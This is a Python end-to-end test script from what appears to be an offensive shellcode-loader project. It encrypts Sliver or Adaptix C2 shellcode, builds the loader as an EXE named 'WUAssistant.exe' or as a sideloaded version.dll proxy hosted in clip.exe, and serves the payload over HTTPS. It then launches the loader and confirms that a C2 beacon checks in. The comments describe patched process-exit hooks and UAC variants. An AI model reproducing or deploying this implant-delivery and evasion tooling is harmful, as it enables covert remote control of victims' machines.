#!/usr/bin/env python3
"""
End-to-end loader integration test.

For each (shellcode, build_config) pair:
  1. Encrypt shellcode with Encrypt.py (--url points at our HTTPS host)
  2. Build loader with build.bat (variant flag)
  3. Host the encrypted payload (URL basename, e.g. payload.dat) on localhost:18443
  4. Launch the built loader (EXE) or load it (DLL)
  5. Poll the C2 (sliver/adaptix) until a beacon checks in OR timeout
  6. Record result, kill loader process, kill host server

Usage:
    python run-loader-test.py --c2 sliver --shellcode payloads/sliver-shellcode.bin --variant exe
    python run-loader-test.py --c2 adaptix --shellcode payloads/adaptix-shellcode.bin --variant exe-uac
    python run-loader-test.py --c2 sliver --shellcode payloads/sliver-shellcode.bin --variant sideload
"""
import argparse
import json
import os
import shutil
import signal
import socket
import ssl
import subprocess
import sys
import time
import urllib3
import urllib.request
from pathlib import Path

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ROOT = Path(__file__).resolve().parents[2]            # zero-loader/
TESTDIR = Path(__file__).resolve().parent             # tests/c2-integration/
LOGS = TESTDIR / "logs"
LOGS.mkdir(exist_ok=True)


# ---------- C2 verification helpers ----------

def sliver_count_sessions() -> int:
    """Count active Sliver sessions/beacons via sliver-client console rc.
    Run inside the container via `script` to allocate a PTY."""
    rc_body = "sessions\nbeacons\nexit\n"
    cmd = [
        "docker", "exec", "zero-sliver", "sh", "-c",
        f"printf '%s' '{rc_body}' > /tmp/check.rc && "
        f"script -qc 'sliver-client console --rc /tmp/check.rc' /dev/null"
    ]
    out = subprocess.run(cmd, capture_output=True, timeout=30,
                       env={**os.environ, "MSYS_NO_PATHCONV": "1"})
    raw = (out.stdout or b"").decode("utf-8", errors="replace") + \
          (out.stderr or b"").decode("utf-8", errors="replace")
    # strip ANSI escapes
    import re
    txt = re.sub(r"\x1b\[[0-9;]*[a-zA-Z]", "", raw)
    # Sliver session/beacon rows look like:
    #  e648721a   http(s)     172.17.0.1:35284   DESKTOP-...   x   windows/amd64   [DEAD]
    # We count any line that has an 8-hex-char id followed by a transport keyword.
    n = 0
    for line in txt.splitlines():
        line = line.strip()
        if not line: continue
        # row id is 8 lowercase hex chars
        m = re.match(r"^([a-f0-9]{8})\s+", line)
        if not m: continue
        lower = line.lower()
        if not any(t in lower for t in ("http", "mtls", "wg", "dns", "tcp")):
            continue
        # Skip dead sessions for the "did we get a beacon" check
        if "[dead]" in lower:
            continue
        n += 1
    return n


def adaptix_count_agents(server_url: str = "https://127.0.0.1:4321/endpoint",
                        password: str = "pass") -> int:
    try:
        r = requests.post(f"{server_url}/login",
                         json={"username":"op", "password":password, "version":"v1.2"},
                         verify=False, timeout=5)
        tok = r.json().get("access_token")
        if not tok:
            return -1
        # Adaptix has GET /agents/all or similar - let's try a few common ones
        for path in ("/agent/all", "/agents", "/agent/list"):
            r = requests.get(f"{server_url}{path}",
                           headers={"Authorization": f"Bearer {tok}"},
                           verify=False, timeout=5)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, list):
                    return len(data)
                if isinstance(data, dict) and "agents" in data:
                    return len(data["agents"])
        return 0
    except Exception as e:
        print(f"[!] adaptix query: {e}", file=sys.stderr)
        return -1


# ---------- Build helpers ----------

def run_step(cmd, cwd=None, check=True, env=None):
    print(f"[*] $ {' '.join(cmd) if isinstance(cmd, list) else cmd}")
    # On Windows, .bat files need cmd.exe /c .\file.bat (cwd not in PATH)
    if os.name == "nt" and isinstance(cmd, list) and cmd and cmd[0].lower().endswith(".bat"):
        bat = cmd[0]
        if not bat.startswith(".") and "\\" not in bat and "/" not in bat:
            bat = ".\\" + bat
        cmd = ["cmd.exe", "/c", bat] + cmd[1:]
        use_shell = False
    else:
        use_shell = isinstance(cmd, str)
    r = subprocess.run(cmd, cwd=cwd, shell=use_shell,
                      capture_output=True, env=env)
    so = (r.stdout or b"").decode("utf-8", errors="replace")
    se = (r.stderr or b"").decode("utf-8", errors="replace")
    def _safe_print(s, f=sys.stdout):
        s = s.encode("ascii", errors="replace").decode("ascii")
        try: f.write(s + "\n")
        except Exception: pass
    if so: _safe_print(so)
    if se: _safe_print(se, sys.stderr)
    if check and r.returncode != 0:
        raise SystemExit(f"[!] step failed (rc={r.returncode})")
    return r


def encrypt_and_build(shellcode: Path, variant: str, url: str, rwx: bool = False) -> Path:
    """Returns path to the built loader artifact."""
    run_step([sys.executable, "Encrypt.py", str(shellcode), "--url", url], cwd=ROOT)

    build_env = {**os.environ}
    if rwx:
        build_env["CFLAGS_EXTRA"] = "/DRWX_SHELLCODE"

    if variant == "exe":
        run_step(["build.bat"], cwd=ROOT, env=build_env)
        return ROOT / "WUAssistant.exe"
    if variant == "exe-uac":
        run_step(["build.bat", "uac"], cwd=ROOT, env=build_env)
        return ROOT / "WUAssistant.exe"
    if variant == "sideload":
        run_step([sys.executable, "SideloadGen.py", r"C:\Windows\System32\version.dll"], cwd=ROOT)
        run_step(["build.bat", "sideload", "version.dll"], cwd=ROOT, env=build_env)
        return ROOT / "version.dll"
    if variant == "sideload-uac":
        run_step([sys.executable, "SideloadGen.py", r"C:\Windows\System32\version.dll"], cwd=ROOT)
        run_step(["build.bat", "sideload", "version.dll", "uac"], cwd=ROOT, env=build_env)
        return ROOT / "version.dll"
    raise SystemExit(f"unknown variant {variant}")


# ---------- Loader execution ----------

def launch_loader(artifact: Path, variant: str, workdir: Path) -> subprocess.Popen:
    """Spawn the loader. For DLL variants, set up sideload host EXE + renamed original DLL."""
    workdir.mkdir(parents=True, exist_ok=True)
    if variant.startswith("exe"):
        dst = workdir / "WUAssistant.exe"
        shutil.copy2(artifact, dst)
        return subprocess.Popen([str(dst)], cwd=str(workdir),
                               creationflags=subprocess.CREATE_NEW_CONSOLE if os.name == "nt" else 0)
    # sideload: place proxy DLL + renamed original + host EXE in workdir
    proxy_dst = workdir / "version.dll"
    shutil.copy2(artifact, proxy_dst)
    # Pull the legitimate version.dll from System32 (used by export forwarding)
    orig_src = Path(r"C:\Windows\System32\version.dll")
    shutil.copy2(orig_src, workdir / "version_orig.dll")
    # clip.exe is small, signed, and statically imports version.dll.
    # It reads from stdin; we close stdin so it exits — except RtlExitUserProcess
    # is patched by our DllMain exit-hook, so the process keeps living while
    # the TpAllocWork-queued loader pipeline runs to completion.
    host_src = Path(r"C:\Windows\System32\clip.exe")
    host_dst = workdir / "clip.exe"
    shutil.copy2(host_src, host_dst)
    return subprocess.Popen([str(host_dst)], cwd=str(workdir),
                           stdin=subprocess.DEVNULL,
                           creationflags=subprocess.CREATE_NEW_CONSOLE if os.name == "nt" else 0)


# ---------- HTTPS payload server ----------

def start_payload_server(enc_path: Path, port: int) -> subprocess.Popen:
    log = LOGS / f"payload-server-{port}.log"
    fh = open(log, "wb")
    return subprocess.Popen(
        [sys.executable, str(TESTDIR / "host-payload.py"),
         "--port", str(port), "--enc", str(enc_path),
         "--certdir", str(TESTDIR / "certs")],
        stdout=fh, stderr=fh, cwd=str(TESTDIR)
    )


# ---------- Main test ----------

def run_one_test(c2: str, shellcode: Path, variant: str, port: int = 18443,
                 wait_seconds: int = 60) -> dict:
    label = f"{c2}-{variant}"
    print(f"\n========== TEST: {label} ==========")

    if c2 == "sliver":
        before = sliver_count_sessions()
    elif c2 == "adaptix":
        before = adaptix_count_agents()
    else:
        raise SystemExit(f"unknown c2 {c2}")
    print(f"[*] {c2} beacon count BEFORE = {before}")

    url = f"https://127.0.0.1:{port}/payload.dat"
    artifact = encrypt_and_build(shellcode, variant, url, rwx=(c2 == "sliver"))
    # Encrypt.py derives output filename from URL — for this URL the file is payload.dat
    enc_path = ROOT / "payload.dat"
    if not enc_path.exists():
        return {"label": label, "ok": False, "error": "payload.dat missing after build"}

    # Persist the per-variant encrypted blob
    per_variant_enc = TESTDIR / "payloads" / f"{label}-payload.dat"
    shutil.copy2(enc_path, per_variant_enc)

    workdir = TESTDIR / "runtime" / label
    if workdir.exists():
        shutil.rmtree(workdir, ignore_errors=True)
    workdir.mkdir(parents=True, exist_ok=True)

    srv = start_payload_server(enc_path, port)
    time.sleep(2)

    loader_proc = None
    try:
        loader_proc = launch_loader(artifact, variant, workdir)
        print(f"[*] Loader launched, pid={loader_proc.pid}")

        deadline = time.time() + wait_seconds
        delta = 0
        while time.time() < deadline:
            time.sleep(5)
            now = sliver_count_sessions() if c2 == "sliver" else adaptix_count_agents()
            if now > before:
                delta = now - before
                break
            print(f"[.] elapsed {int(time.time() - (deadline - wait_seconds))}s, count={now}")

        ok = delta > 0
        return {
            "label": label,
            "ok": ok,
            "before": before,
            "after": before + delta,
            "delta": delta,
            "artifact": str(artifact),
            "size": artifact.stat().st_size,
            "enc": str(per_variant_enc),
            "enc_size": per_variant_enc.stat().st_size,
        }
    finally:
        if loader_proc and loader_proc.poll() is None:
            print(f"[*] Killing loader pid={loader_proc.pid}")
            try:
                loader_proc.kill()
            except Exception: pass
        # Also kill orphaned host EXEs (clip.exe, WUAssistant.exe) that survive
        if os.name == "nt":
            for exe in ("WUAssistant.exe", "clip.exe"):
                subprocess.run(["taskkill", "/F", "/IM", exe], capture_output=True)
        if srv.poll() is None:
            try: srv.terminate(); srv.wait(timeout=5)
            except Exception:
                try: srv.kill()
                except Exception: pass


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--c2", required=True, choices=["sliver", "adaptix"])
    ap.add_argument("--shellcode", required=True)
    ap.add_argument("--variant", required=True,
                    choices=["exe", "exe-uac", "sideload", "sideload-uac"])
    ap.add_argument("--port", type=int, default=18443)
    ap.add_argument("--wait", type=int, default=90)
    ap.add_argument("--report", default=None)
    args = ap.parse_args()

    res = run_one_test(args.c2, Path(args.shellcode).resolve(),
                       args.variant, args.port, args.wait)
    print("\nRESULT:", json.dumps(res, indent=2))
    if args.report:
        Path(args.report).write_text(json.dumps(res, indent=2))
    return 0 if res.get("ok") else 1


if __name__ == "__main__":
    sys.exit(main())
